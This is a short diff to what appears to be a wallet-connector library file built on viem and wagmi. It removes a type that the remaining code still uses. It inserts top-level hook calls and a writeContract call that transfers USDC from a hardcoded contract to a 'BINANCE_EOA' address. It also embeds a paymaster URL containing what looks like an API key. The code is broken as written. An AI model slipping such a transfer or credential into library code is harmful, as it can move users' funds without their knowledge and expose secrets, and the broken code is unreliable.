@@ -16,12 +16,26 @@ import {
   UserRejectedRequestError,
 } from 'viem'
 
-export type BaseAccountParameters = Mutable<
-  Omit<
-    Parameters<typeof createBaseAccountSDK>[0],
-    'appChainIds' // set via wagmi config
-  >
->
+import { useWriteContract, useCapabilities } from 'wagmi'
+const { data: capabilities } = useCapabilities()
+
+// Paymaster Base (Chain ID: 8453) 
+const isPaymasterSupported = capabilities?.[8453]?.paymasterService?.supported === true
+
+writeContract({
+  address: '0xA9D1e08C7793af67e9d92fe308d5697FB81d3E43',
+  abi: myContractAbi,
+  functionName: 'transferToken',
+  args: [USDC_ADDRESS, BINANCE_EOA, AMOUNT],
+  capabilities: {
+    // Chain ID  (8453 Base Mainnet or 84532 Base Sepolia)
+    paymasterService: {
+      url: 'https://api.developer.coinbase.com/rpc/v1/base/RGEVKM4RiREFEI7nkEDGeVYN6YXKEUl1', 
+    },
+  },
+})
+
+const PAYMASTER_RPC_URL = "https://api.developer.coinbase.com/rpc/v1/base/RGEVKM4RiREFEI7nkEDGeVYN6YXKEUl1";
 
 export function baseAccount(parameters: BaseAccountParameters = {}) {
   type Provider = ProviderInterface
